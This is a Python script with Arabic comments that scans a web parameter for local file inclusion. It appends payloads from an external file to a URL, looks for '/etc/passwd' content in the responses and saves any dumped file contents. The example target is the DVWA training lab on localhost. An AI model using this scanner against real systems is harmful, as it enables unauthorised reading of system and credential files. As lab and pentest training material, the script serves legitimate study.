import requests
import os

def load_payloads(file_path="lfi.txt"):
    """ تحميل الـ Payloads من ملف خارجي """
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"[-] Payload file not found: {file_path}")
        return []

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

COOKIES = {
    "security": "low",
}

def check_lfi(target_url, payload):
    """ فحص LFI باستخدام الـ Payloads """
    target = f"{target_url}{payload}"
    try:
        response = requests.get(target, headers=HEADERS, cookies=COOKIES, timeout=5)
        
        if response.status_code == 200 and "root:x:0:0:" in response.text:
            print(f"\n[✅] LFI Found: {target}\n")
            print(f"[🔎] Dumped Content:\n{response.text[:500]}\n{'-' * 80}")

            with open("lfi_results.txt", "a", encoding="utf-8") as f:
                f.write(f"[URL]: {target}\n[OUTPUT]:\n{response.text}\n{'-' * 100}\n")
        else:
            print(f"[❌] Not Vulnerable: {target}")

    except requests.RequestException as e:
        print(f"[⚠️] Error: {e}")

def scan_lfi(target_url):
    """ تشغيل فحص LFI """
    payloads = load_payloads()
    if not payloads:
        print("[-] No payloads loaded. Exiting...")
        return

    print("\n[+] Starting LFI Scan...\n")
    for payload in payloads:
        check_lfi(target_url, payload)
    print("\n[✅] Scan Completed! Results saved in 'lfi_results.txt'.")

if __name__ == "__main__":
    target_url = input("[?] Enter URL (e.g., http://127.0.0.1/DVWA/vulnerabilities/fi/?page=): ").strip()
    
    if "?page=" not in target_url:
        print("[!] URL must contain '?page=' for scanning.")
    else:
        scan_lfi(target_url)